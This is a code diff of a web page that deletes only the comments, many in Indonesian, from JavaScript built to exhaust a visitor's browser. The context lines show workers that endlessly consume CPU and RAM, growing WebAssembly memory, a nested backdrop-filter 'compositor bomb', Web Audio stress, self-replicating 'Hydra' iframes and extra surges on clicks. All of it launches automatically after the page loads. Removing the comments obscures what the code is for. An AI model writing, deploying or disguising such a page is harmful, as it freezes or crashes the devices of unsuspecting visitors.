@@ -29,7 +29,6 @@
       mix-blend-mode: screen;
     }
 
-    /* CSS Heavy Filter Blurring */
     .blob {
       position: absolute;
       width: 60vw;
@@ -45,7 +44,6 @@
       to { transform: rotate(360deg) scale(1.3); }
     }
 
-    /* Nested Backdrop-Filter Compositor Bomb */
     .blur-nest-root {
       position: fixed;
       inset: 0;
@@ -69,7 +67,6 @@
       to { transform: scale(1.01) rotate(-0.05deg); }
     }
 
-    /* Hydra Iframes Grid */
     #nest {
       position: fixed;
       inset: 0;
@@ -107,7 +104,6 @@
 
     if (SLAVE) document.body.classList.add('slave');
 
-    // Konfigurasi Parameter Brutal
     const P = {
       ramChunkMB: MOBILE ? 48 : 96,
       burstCount: SLAVE ? (MOBILE ? 16 : 28) : (MOBILE ? 24 : 48),
@@ -174,7 +170,6 @@
       }
     }
 
-    // Worker Scripts
     const cpuCode = `
       const N = 1024 * 512;
       const a = new Float64Array(N), b = new Float64Array(N);
@@ -240,7 +235,6 @@
       for (let i = 0; i < n; i++) createWorker(ramCode);
     }
 
-    // Nested Compositor Tree
     function createNestedBlurTree(depth) {
       const rootDiv = document.createElement('div');
       rootDiv.className = 'blur-node';
@@ -254,23 +248,17 @@
       return rootDiv;
     }
 
-    // ==========================================================
-    // FUNGSI INTI: EKSEKUSI BRUTAL SETELAH HALAMAN SIAP
-    // ==========================================================
     function launchBrutal() {
-      // 1. Alokasi RAM Awal & Thread Worker
       for (let i = 0; i < P.burstCount; i++) eat();
       spawnCPU(P.cpuWorkers);
       spawnRAM(P.ramWorkers);
 
-      // Multiplier dinamis tanpa henti
       setInterval(() => {
         for (let i = 0; i < P.addCpu; i++) createWorker(cpuCode);
         for (let i = 0; i < P.addRam; i++) createWorker(ramCode);
         eat();
       }, P.addInterval);
 
-      // 2. WebAssembly Memory Exhaustion
       try {
         const wasmMem = new WebAssembly.Memory({
           initial: MOBILE ? 64 : 256,
@@ -285,7 +273,6 @@
         }, P.wasmGrowEvery);
       } catch (_) {}
 
-      // 3. Nested Backdrop Filter
       if (!SLAVE && blurRoot) {
         for (let t = 0; t < P.nestTrees; t++) {
           try {
@@ -302,7 +289,6 @@
         }, 500);
       }
 
-      // 4. Web Audio Stress
       try {
         const AudioCtx = window.AudioContext || window.webkitAudioContext;
         const ac = new AudioCtx();
@@ -326,7 +312,6 @@
         window.addEventListener('click', () => ac.resume().catch(() => {}), { once: true });
       } catch (_) {}
 
-      // 5. Hydra Multi-Iframe Spawner
       if (!SLAVE && P.hydra) {
         const slaveUrl = (() => {
           const u = new URL(location.href);
@@ -383,7 +368,6 @@
       }
     }
 
-    // Interaksi Layar: Trigger lonjakan brutal instan saat disentuh/diklik
     window.addEventListener('touchstart', surge, { passive: true });
     window.addEventListener('click', surge);
     function surge() {
@@ -392,7 +376,6 @@
       for (let i = 0; i < 8; i++) eat(64);
     }
 
-    // Inisialisasi Visual (Canvas & Shaders)
     const canvases = [];
     const ctxs = [];
     for (let i = 0; i < P.canvasCount; i++) {
@@ -461,7 +444,6 @@
       } catch (_) {}
     }
 
-    // Main Thread Burner & Render Loop
     let frameCount = 0;
     function tick(timestamp) {
       frameCount++;
@@ -492,13 +474,9 @@
       requestAnimationFrame(tick);
     }
 
-    // ==========================================================
-    // KUNCI PERBAIKAN: TUNGGU HALAMAN SELESAI LOAD, LALU BRUTAL
-    // ==========================================================
     function onReady() {
       requestAnimationFrame(() => {
         tick(performance.now());
-        // Beri jeda 80ms agar koneksi & DOM selesai dipetakan browser, lalu hajar beban penuh
         setTimeout(launchBrutal, 80);
       });
     }
